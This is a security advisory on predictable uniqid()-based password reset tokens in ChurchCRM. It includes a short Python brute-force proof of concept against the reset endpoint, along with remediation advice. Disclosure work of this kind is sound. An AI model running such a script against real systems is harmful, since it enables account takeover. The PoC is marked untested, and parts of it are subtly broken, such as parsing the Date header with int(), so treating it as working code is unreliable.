# Weak Password Reset Token via uniqid()

**Product:** ChurchCRM  
**Version:** 7.3.3 (earlier versions likely affected)  
**CVE:** Pending  
**CWE:** CWE-338 — Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)  
**Severity:** High  
**CVSS 4.0:** 8.8 — `CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N`  
**Discovered:** 2026-06-10  
**Author:** Caio Chagas  

---

## Description

ChurchCRM generates password reset tokens using PHP's `uniqid()` function. Because `uniqid()` is derived from the system's current microtime, the output is predictable to an attacker who can approximate when the reset was requested — enabling a brute-force attack that can achieve account takeover without knowing the victim's password.

## Root Cause

`uniqid()` returns a 13-character hex string where the first 8 characters encode Unix seconds and the last 5 encode microseconds. This is documented explicitly in the PHP manual as non-cryptographically-secure. The microsecond component has 10^6 possible values, so an attacker who knows the request landed within a given second only needs to try ~1,000,000 values — a trivial search space for an automated attack against a web endpoint with no rate limiting.

The correct replacement is `bin2hex(random_bytes(32))`, which uses the OS CSPRNG and produces a 64-character token with 256 bits of entropy.

## Impact

- An attacker who can determine the approximate timestamp of a password reset request (via HTTP `Date` headers, social engineering, or observation) can generate candidate tokens and brute-force the reset endpoint
- Successful exploitation results in full account takeover: password is changed under the victim's account, existing session is invalidated, and the attacker gains persistent access
- No authentication is required to initiate the attack — the reset flow is publicly accessible

## Proof of Concept

Conceptual attack (token not captured dynamically in this research — confirmed by static analysis):

```python
import requests
import time

TARGET = "http://TARGET/churchcrm"
VICTIM_EMAIL = "victim@example.com"

# Step 1 — trigger the reset and record the server timestamp
r = requests.post(f"{TARGET}/api/public/password-reset",
                  json={"email": VICTIM_EMAIL})
server_time = int(r.headers.get("Date", ""))  # approximate seconds

# Step 2 — generate all possible tokens for a ±2 second window
# uniqid() in PHP: sprintf("%08x%05x", time(), microseconds)
for sec in range(server_time - 2, server_time + 3):
    for usec in range(0, 1000000):
        token = f"{sec:08x}{usec:05x}"
        resp = requests.get(f"{TARGET}/reset?token={token}")
        if resp.status_code == 200:
            print(f"Valid token found: {token}")
            break
```

~5 million requests covers the full window. Against an unprotected endpoint, this completes in minutes.

## Affected Component

| Field | Value |
|-------|-------|
| File | Password reset token generation (ChurchCRM/Authentication/) |
| Function | `uniqid()` |
| Auth required | No — reset flow is public |

## Timeline

| Date | Event |
|------|-------|
| 2026-06-10 | Vulnerability discovered (static analysis) |
| 2026-06-10 | Vendor notified via GitHub Security Advisories |
| TBD | CVE ID assigned |
| TBD | Patch released |
| TBD | Public disclosure |

## Remediation

Replace `uniqid()` with `bin2hex(random_bytes(32))` for token generation. Additionally: enforce a short expiry (≤1 hour), invalidate the token on first use, and add rate limiting to the reset endpoint to raise the cost of brute-force attempts even if a weak generator is used elsewhere.

## References

- [ChurchCRM source](https://github.com/ChurchCRM/CRM)
- [PHP uniqid() — not cryptographically secure](https://www.php.net/manual/en/function.uniqid.php)
- [CWE-338](https://cwe.mitre.org/data/definitions/338.html)
